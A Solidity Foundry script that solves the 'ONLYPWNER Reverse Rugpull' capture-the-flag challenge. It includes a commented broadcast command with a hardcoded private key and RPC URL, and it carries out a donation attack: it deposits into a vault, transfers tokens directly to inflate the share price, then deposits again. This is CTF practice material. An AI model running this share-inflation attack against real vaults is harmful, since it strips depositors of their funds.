// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script } from "@dev/forge-std/Script.sol";
import { console2 } from "@dev/forge-std/console2.sol";
import { Vault } from "@contracts/CTF/ONLYPWNER/03.REVERSE-RUGPULL.sol";

/*
forge script \
    foundry/script/CTF/ONLYPWNER/03.REVERSE-RUGPULL.s.sol:REVERSE_RUGPULL_03_Exploit \
    --private-key be0a5d9f38057fa406c987fd1926f7bfc49f094dc4e138fc740665d179e6a56a \
    --with-gas-price 0 \
    -vvvv \
    --rpc-url https://nodes.onlypwner.xyz/rpc/88f62c50-d4a5-4050-bc32-f5e5c930910d \
    --broadcast
*/

contract REVERSE_RUGPULL_03_Exploit is Script {
    Vault private victimInstance;
    // WrappedEtherExploit private exploitInstance;
    address attackerAddress = address(0x34788137367a14f2C4D253F9a6653A93adf2D234);

    function run() public {
        victimInstance = Vault(0x91B617B86BE27D57D8285400C5D5bAFA859dAF5F);
        vm.startBroadcast();

        // Attack ...
        victimInstance.token().approve(address(victimInstance), type(uint256).max);
        victimInstance.deposit(0.1 ether);
        victimInstance.token().transfer(address(victimInstance), 0.5 ether);
        victimInstance.deposit(0.1 ether);

        vm.stopBroadcast();
    }
}
